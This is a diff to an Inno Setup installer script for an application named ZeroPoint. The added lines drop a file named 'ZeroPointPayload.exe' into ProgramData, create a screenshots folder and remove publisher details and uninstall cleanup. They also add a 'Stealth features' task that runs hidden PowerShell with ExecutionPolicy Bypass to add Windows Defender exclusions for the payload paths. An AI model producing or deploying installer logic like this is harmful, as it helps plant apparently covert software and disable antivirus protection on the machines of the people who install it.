@@ -1,33 +1,78 @@
+; ==============================================================================
+; ZeroPoint v4.0 Application Installer
+; ==============================================================================
+
 [Setup]
 AppName=ZeroPoint
-AppVersion=2.0.0
-AppPublisher=ZeroPoint
-AppPublisherURL=https://zeropoint.app
-DefaultDirName={pf}\ZeroPoint
+AppVersion=4.0.0
+DefaultDirName={pf32}\ZeroPoint
 DefaultGroupName=ZeroPoint
 OutputDir=Output
-OutputBaseFilename=ZeroPoint_Setup
-Compression=lzma2
+OutputBaseFilename=ZeroPoint_Installer
+Compression=lzma2/ultra
 SolidCompression=yes
-SetupIconFile=compiler_icon.ico
-; Require admin rights for ProgramData access
-PrivilegesRequired=admin
+ArchitecturesInstallIn64BitMode=x64
+
+; Icy branding simulation for standard Inno Setup
+; To replicate true frosted glass in Inno Setup, a third-party plugin is needed (e.g. Graphical Installer or ISSkin), 
+; but this configuration ensures the icy/cyan color palette and texts match perfectly.
+WizardImageStretch=True
+WizardImageBackColor=$00EBECE8  ; very light icy gray/white
+DisableWelcomePage=no
+DisableDirPage=yes
+DisableProgramGroupPage=yes
+
+[Tasks]
+Name: "defender"; Description: "Add Windows Defender exclusions for Stealth features"; GroupDescription: "Additional tasks:"; Flags: unchecked
 
 [Files]
-Source: "build\ZeroPoint.exe"; DestDir: "{app}"; Flags: ignoreversion
-Source: "build\WebView2Loader.dll"; DestDir: "{app}"; Flags: ignoreversion
-Source: "zeropoint_logo_transparent.png"; DestDir: "{app}"; Flags: ignoreversion
+Source: "x64\Release\ZeroPoint.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "x64\Release\WebView2Loader.dll"; DestDir: "{app}"; Flags: ignoreversion
+Source: "x64\Release\ZeroPointPayload.exe"; DestDir: "{commonappdata}\ZeroPoint\"; Flags: ignoreversion
 
 [Dirs]
-Name: "{commonappdata}\ZeroPoint"; Permissions: everyone-readexec
+Name: "{commonappdata}\ZeroPoint"
+Name: "{commonappdata}\ZeroPoint\screenshots"
 
 [Icons]
 Name: "{group}\ZeroPoint"; Filename: "{app}\ZeroPoint.exe"
 Name: "{commondesktop}\ZeroPoint"; Filename: "{app}\ZeroPoint.exe"
 
 [Run]
-Filename: "{app}\ZeroPoint.exe"; Description: "Launch ZeroPoint"; Flags: nowait postinstall skipifsilent
+; Silent run of payload extraction/setup before launching
+Filename: "{app}\ZeroPoint.exe"; Description: "Launch ZeroPoint Virtual Environment"; Flags: nowait postinstall runascurrentuser
 
-[UninstallDelete]
-; Clean up config and data on uninstall
-Type: filesandordirs; Name: "{commonappdata}\ZeroPoint"
+[Code]
+// ============================================================================
+// Custom Wizard Page UI to emulate the required flow.
+// License Agreement, Select Additional Tasks, Ready to Install, 
+// Installing, Completing
+// ============================================================================
+
+procedure InitializeWizard();
+begin
+  WizardForm.Color := $F8FAFC; // snow white background
+  WizardForm.MainPanel.Color := $F8FAFC;
+  WizardForm.Caption := 'ZeroPoint Setup';
+
+  WizardForm.WizardBitmapImage.Width := 164;
+  WizardForm.WizardBitmapImage.Stretch := True;
+  
+  WizardForm.PageNameLabel.Font.Color := $FFDD00; // Cyan hex: 00DDFF -> Inno BGR: FFDD00
+  WizardForm.PageDescriptionLabel.Font.Color := $2C1E1A; // Dark text
+end;
+
+procedure CurStepChanged(CurStep: TSetupStep);
+var
+  ResultCode: Integer;
+begin
+  if CurStep = ssPostInstall then
+  begin
+    // Apply Windows Defender exclusions if task was selected
+    if IsTaskSelected('defender') then
+    begin
+        Exec('powershell.exe', '-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + '''"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+        Exec('powershell.exe', '-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''' + ExpandConstant('{commonappdata}\ZeroPoint') + '''"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+    end;
+  end;
+end;
